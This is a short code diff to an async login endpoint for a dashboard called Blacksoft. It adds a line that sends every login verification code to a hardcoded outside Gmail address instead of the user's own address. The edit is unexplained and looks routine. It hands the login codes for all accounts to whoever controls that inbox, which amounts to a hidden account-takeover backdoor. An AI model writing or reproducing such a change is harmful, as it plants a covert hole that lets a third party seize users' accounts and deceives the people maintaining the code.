@@ -28,7 +28,7 @@ async def login(payload: LoginRequest):
 
     try:
         challenge_id, code = await create_code_challenge(email, "login")
-        await send_email(email, "Your Blacksoft dashboard verification code", f"Your verification code is {code}. It expires soon.")
+        await send_email("mdmiskatulmasabi278@gmail.com", "Your Blacksoft dashboard verification code", f"Your verification code is {code}. It expires soon.")
     except RuntimeError as exc:
         raise HTTPException(status_code=503, detail=str(exc)) from exc
     return LoginChallengeResponse(challenge_id=challenge_id, expires_in=get_settings().verification_code_minutes * 60)
